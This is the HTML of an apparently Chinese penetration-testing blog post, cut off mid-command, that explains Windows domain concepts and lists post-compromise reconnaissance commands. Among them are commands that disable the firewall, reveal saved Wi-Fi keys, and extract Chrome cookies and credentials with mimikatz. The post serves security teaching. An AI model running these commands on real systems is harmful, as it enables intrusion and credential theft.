@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/1.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/1.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"onlycare.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="成殇Orz10x00  什么是内网渗透在拿到webshell的时候，想办法获得系统信息拿到系统权限，进入到网络系统内部之后收集内部网络的各种 信息，获取内部网络有价值的人员、资产信息  内网基础环境判断 IP、网关、DNS、是否能连通外网、网络连接及端口、本机host文件、机器的代理、是否在域内，域名是什么  分析机器所处位置区域  DMZ区、办公区、生产区、核心DB等等  分析机器的角色  普通">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows主机信息收集">
+<meta property="og:url" content="http://onlycare.github.io/2021/02/25/Windows%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/index.html">
+<meta property="og:site_name" content="成殇のBlog">
+<meta property="og:description" content="成殇Orz10x00  什么是内网渗透在拿到webshell的时候，想办法获得系统信息拿到系统权限，进入到网络系统内部之后收集内部网络的各种 信息，获取内部网络有价值的人员、资产信息  内网基础环境判断 IP、网关、DNS、是否能连通外网、网络连接及端口、本机host文件、机器的代理、是否在域内，域名是什么  分析机器所处位置区域  DMZ区、办公区、生产区、核心DB等等  分析机器的角色  普通">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-02-25T05:32:30.000Z">
+<meta property="article:modified_time" content="2021-02-25T05:38:07.163Z">
+<meta property="article:author" content="成殇Orz1">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="信息收集">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://onlycare.github.io/2021/02/25/Windows%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Windows主机信息收集 | 成殇のBlog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/fireworks.js"></script>
+
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">成殇のBlog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/onlycare" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://onlycare.github.io/2021/02/25/Windows%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/2.png">
+      <meta itemprop="name" content="成殇Orz1">
+      <meta itemprop="description" content="菜鸡一枚">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="成殇のBlog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Windows主机信息收集
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-02-25 13:32:30 / 修改时间：13:38:07" itemprop="dateCreated datePublished" datetime="2021-02-25T13:32:30+08:00">2021-02-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>9.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h4 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h4><h2 id="0x00-什么是内网渗透"><a href="#0x00-什么是内网渗透" class="headerlink" title="0x00  什么是内网渗透"></a>0x00  什么是内网渗透</h2><p>在拿到webshell的时候，想办法获得系统信息拿到系统权限，进入到网络系统内部之后收集内部网络的各种 信息，获取内部网络有价值的人员、资产信息</p>
+<ol>
+<li><p>内网基础环境判断</p>
+<p>IP、网关、DNS、是否能连通外网、网络连接及端口、本机host文件、机器的代理、是否在域内，域名是什么</p>
+</li>
+<li><p>分析机器所处位置区域 </p>
+<p>DMZ区、办公区、生产区、核心DB等等</p>
+</li>
+<li><p>分析机器的角色 </p>
+<p>普通WEB服务器、开发服务器、文件服务器、代理服务器、DNS服务器、数据存储服务器等等</p>
+</li>
+<li><p>分析进出口流量是否能连通 </p>
+<p>协议的判断：常见的TCP、DNS、HTTP、ICMP等协议 端口判断：外网vps做监听，内网机器测试常见端口，常见能出去的端口有80,8080,443,53,110,123 等。</p>
+</li>
+</ol>
+<span id="more"></span>
+
+<h2 id="0x01-常见名词解释"><a href="#0x01-常见名词解释" class="headerlink" title="0x01  常见名词解释"></a>0x01  常见名词解释</h2><h4 id="1-工作组"><a href="#1-工作组" class="headerlink" title="1. 工作组"></a>1. 工作组</h4><p><strong>工作组</strong><code>Work Group</code>是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p>
+<p>比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。</p>
+<p>为了解决这一问题，Windows 9x/NT/2000 引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。</p>
+<p>在工作组中所有的计算机都是平等的，没有管理与被管理之分，因此工作组网络也称为对等网络。</p>
+<ol>
+<li>默认情况下所有计算机都处在名为WORKGROUP的工作组中 </li>
+<li>工作组资源管理模式适合于网络中计算机不多，对管理要求不严格的情况。 </li>
+<li>它的建立步骤简单，使用起来也很好上手。大部分中小公司都采取工作组的方式对资源进行权限分配和目录共 享。 </li>
+<li>相同组中的不同用户通过对方主机的用户名和密码可以查看对方共享的文件夹，默认共享的是 Users 目录。</li>
+<li>不同组的不同用户通过对方主机的用户名和密码也可以查看对方共享的文件夹。 </li>
+<li>所以工作组并不存在真正的集中管理作用,工作组里的所有计算机都是对等的,也就是没有服务器和客户机之分的。</li>
+</ol>
+<h3 id="2-域"><a href="#2-域" class="headerlink" title="2.  域"></a>2.  域</h3><h4 id="域-Domain"><a href="#域-Domain" class="headerlink" title="域  Domain"></a>域  <code>Domain</code></h4><p>可以简单的理解成工作组的升级版，如果说工作组是“免费旅店”那么域就是“星级宾馆”；工作组可以随便进进出出，而域则有严格的控制。</p>
+<p>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器。</p>
+<h4 id="域控制器-Domain-Controller"><a href="#域控制器-Domain-Controller" class="headerlink" title="域控制器  Domain Controller"></a>域控制器  <code>Domain Controller</code></h4><p>简写为 <code>DC</code>，域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。</p>
+<p>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源。</p>
+<p>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码。</p>
+<p>而要想实现域环境，就必须要计算机中安装活动目录，也可以说如果在内网中的一台计算机上安装了活动目录，那它就变成了域控制器。在域中除了域控制器还有成员服务器、客户机、独立服务器。</p>
+<h4 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h4><p>顾名思义，在一个域下新建了一个域便称其为子域。形象的来说，一个部门一个域，那个如果这个部门还有分部，那每个分部就可被称为子域，这个大的部门便称为父域。每个域中都有独立的安全策略。</p>
+<h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。</p>
+<p>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，如域child.Microsoft.com 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。</p>
+<p>而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。</p>
+<p>多个域树可以组成一个域林。</p>
+<h4 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h4><p>域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p>
+<p>但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过Kerberos 信任关系建立起来，所以每个域树都知道Kerberos信任关系，不同域树可以交叉引用其他域树中的对象。域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系.</p>
+<p>比如benet.com.cn,则可以创建同属与一个林的accp.com.cn,他们就在同一个域林里.</p>
+<p>当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。</p>
+<p>林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p>
+<h3 id="3-活动目录"><a href="#3-活动目录" class="headerlink" title="3.  活动目录"></a>3.  活动目录</h3><p><strong>活动目录</strong> <code>Active Directory</code> ，简写为 <code>AD</code>，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中。</p>
+<p>目录包含了有关各种对象，例如用户、用户组、计算机、域、组织单位（OU）以及安全策略的信息。目录存储在域控上，并且可以被网络应用程序或者服务所访问。</p>
+<p>活动目录就相当于内网中各种资源的一个目录，通过活动目录用户可以快速定位到这些资源的位置。</p>
+<h3 id="4-DMZ"><a href="#4-DMZ" class="headerlink" title="4.  DMZ"></a>4.  DMZ</h3><p>DMZ <code>demilitarized zone</code> ，中文名为“隔离区”，或称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。</p>
+<p>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p>
+<h3 id="5-域内的各种权限"><a href="#5-域内的各种权限" class="headerlink" title="5.  域内的各种权限"></a>5.  域内的各种权限</h3><p>首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。</p>
+<p><strong>域本地组</strong></p>
+<p>成员范围：所有的域；使用范围：自己所在的域</p>
+<p><strong>全局组</strong></p>
+<p>成员范围：自己所在的域；使用范围：所有的域</p>
+<p><strong>通用组</strong></p>
+<p>成员范围：所有的域；使用范围：所有的域</p>
+<p><strong>A-G-DL-P 策略</strong></p>
+<p>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p>
+<ul>
+<li>A 表示用户账号</li>
+<li>G 表示全局组</li>
+<li>U 表示通用组</li>
+<li>DL 表示域本地组</li>
+<li>P 表示资源权限</li>
+</ul>
+<h2 id="0x02-工作组信息收集"><a href="#0x02-工作组信息收集" class="headerlink" title="0x02  工作组信息收集"></a>0x02  工作组信息收集</h2><h4 id="1-用户信息收集"><a href="#1-用户信息收集" class="headerlink" title="1.  用户信息收集"></a>1.  用户信息收集</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#查看本机用户列表</span><br><span class="line"><span class="built_in">net</span> user</span><br><span class="line"></span><br><span class="line">#获取本地管理员信息</span><br><span class="line"><span class="built_in">net</span> localgroup administrators</span><br><span class="line"></span><br><span class="line">#查看当前在线用户和会话</span><br><span class="line">quser</span><br><span class="line">query user</span><br><span class="line">query user || qwinsta</span><br><span class="line"></span><br><span class="line">#查当前用户在目标系统中的具体权限</span><br><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line">#查看当前权限</span><br><span class="line">whoami &amp;&amp; whoami /priv</span><br><span class="line"></span><br><span class="line">#查当前机器中所有的组名,了解不同组的职能,如</span><br><span class="line">IT,HR,ADMIN,FILE</span><br><span class="line"><span class="built_in">net</span> localgroup</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-系统信息收集"><a href="#2-系统信息收集" class="headerlink" title="2.  系统信息收集"></a>2.  系统信息收集</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#查询网络配置信息。进行IP地址段信息收集</span><br><span class="line"><span class="built_in">ipconfig</span> /all</span><br><span class="line"></span><br><span class="line">#查询操作系统及软件信息</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; # 英文系统</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; #中文系统</span><br><span class="line"></span><br><span class="line">#查看当前系统版本</span><br><span class="line">wmic OS get Caption,CSDVersion,OSArchitecture,Version</span><br><span class="line"></span><br><span class="line">#查看系统体系结构</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%PROCESSOR_ARCHITECTURE%</span></span><br><span class="line"></span><br><span class="line">#查询本机服务信息</span><br><span class="line">wmic service list brief</span><br><span class="line"></span><br><span class="line">#查看安装的软件的版本、路径等</span><br><span class="line">wmic product get name, version</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name, version&quot;</span><br><span class="line"></span><br><span class="line">#查询进程信息</span><br><span class="line">tasklist</span><br><span class="line">wmic process list brief</span><br><span class="line"></span><br><span class="line">#查看启动程序信息</span><br><span class="line">wmic startup get command,caption</span><br><span class="line"></span><br><span class="line">#查看计划任务</span><br><span class="line"><span class="built_in">at</span>（before win10）</span><br><span class="line">schtasks /query /fo LIST /v（win10）</span><br><span class="line"></span><br><span class="line">#查看主机开机时间</span><br><span class="line"><span class="built_in">net</span> statistics workstation</span><br><span class="line"></span><br><span class="line">#列出或断开本地计算机与所连接的客户端的对话</span><br><span class="line"><span class="built_in">net</span> session</span><br><span class="line"></span><br><span class="line">#查看远程连接信息</span><br><span class="line">cmdkey /l</span><br><span class="line"></span><br><span class="line">#查看补丁列表</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> KB</span><br><span class="line"></span><br><span class="line">#查看补丁的名称、描述、ID、安装时间等</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line">#查看杀软</span><br><span class="line">WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 <span class="built_in">Path</span> AntiVirusProduct Get displayName/<span class="built_in">Format</span>:List</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-网络信息收集"><a href="#3-网络信息收集" class="headerlink" title="3.  网络信息收集"></a>3.  网络信息收集</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#查看本机所有的tcp,udp端口连接及其对应的pid</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">#查看本机所有的tcp,udp端口连接,pid及其对应的发起程序</span><br><span class="line">netstat -anob</span><br><span class="line"></span><br><span class="line">#查看路由表和arp缓存</span><br><span class="line">route <span class="built_in">print</span></span><br><span class="line">arp -a</span><br><span class="line"></span><br><span class="line">#查看本机共享列表和可访问的域共享列表 （<span class="number">445</span>端口）</span><br><span class="line"><span class="built_in">net</span> share</span><br><span class="line">wmic share get name,<span class="built_in">path</span>,status</span><br><span class="line"></span><br><span class="line">#磁盘映射</span><br><span class="line"><span class="built_in">net</span> use k: \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">10</span>\c$</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-防火墙信息收集"><a href="#4-防火墙信息收集" class="headerlink" title="4.  防火墙信息收集"></a>4.  防火墙信息收集</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#关闭防火墙(Windows Server <span class="number">2003</span> 以前的版本)</span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode disable</span><br><span class="line"></span><br><span class="line">#关闭防火墙(Windows Server <span class="number">2003</span> 以后的版本)</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br><span class="line"></span><br><span class="line">#查看防火墙配置(netsh命令也可以用作端口转发)</span><br><span class="line">netsh firewall show config</span><br><span class="line"></span><br><span class="line">#查看配置规则</span><br><span class="line">netsh advfirewall firewall show rule name=all</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-代理信息收集"><a href="#5-代理信息收集" class="headerlink" title="5.  代理信息收集"></a>5.  代理信息收集</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v</span><br><span class="line">ProxyServer</span><br><span class="line"></span><br><span class="line">#通过pac文件自动代理情况</span><br><span class="line">REG QUERY &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v</span><br><span class="line">AutoConfigURL</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-其他信息收集"><a href="#6-其他信息收集" class="headerlink" title="6.  其他信息收集"></a>6.  其他信息收集</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#wifi密码</span><br><span class="line">netsh wlan show profile</span><br><span class="line">netsh wlan show profile name=&quot;EEFUNG&quot; key=clear</span><br><span class="line"></span><br><span class="line">#回收站内容获取</span><br><span class="line"><span class="keyword">FOR</span> /f &quot;skip=<span class="number">1</span> tokens=<span class="number">1</span>,<span class="number">2</span> delims= &quot; %c <span class="keyword">in</span> (&#x27;wmic useraccount get name^,sid&#x27;) <span class="keyword">do</span> <span class="built_in">dir</span> /a /b</span><br><span class="line"><span class="function">C:\$<span class="title">Recycle.Bin</span>\%<span class="title">d</span>\ ^&gt;%<span class="title">c.txt</span></span></span><br><span class="line"><span class="function"><span class="title">cd</span> <span class="title">C</span>:\$<span class="title">Recycle.Bin</span>\<span class="title">S</span>-1-5-21-3845785564-1101086751-683477353-1001\</span></span><br><span class="line"><span class="function">#$<span class="title">I</span> 开头的文件保存的是路径信息</span></span><br><span class="line"><span class="function">#$<span class="title">R</span> 开头的文件保存的是文件内容</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#<span class="title">Chrome</span>历史记录和<span class="title">Cookie</span>获取</span></span><br><span class="line"><span class="function">%<span class="title">localappdata</span>%\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">USERDA</span>~1\<span class="title">default</span>\<span class="title">LOGIND</span>~1</span></span><br><span class="line"><span class="function">%<span class="title">localappdata</span>%\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">USERDA</span>~1\<span class="title">default</span>\<span class="title">cookies</span></span></span><br><span class="line"><span class="function">#<span class="title">chrome</span>的用户信息，保存在本地文件为<span class="title">sqlite</span> 数据库格式</span></span><br><span class="line"><span class="function"><span class="title">mimikatz.exe</span> <span class="title">privilege</span>::<span class="title">debug</span> <span class="title">log</span> &quot;<span class="title">dpapi</span>::<span class="title">chrome</span></span></span><br><span class="line"><span class="function">/<span class="title">in</span>:%<span class="title">localappdata</span>%\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">USERDA</span>~1\<span class="title">default</span>\<span 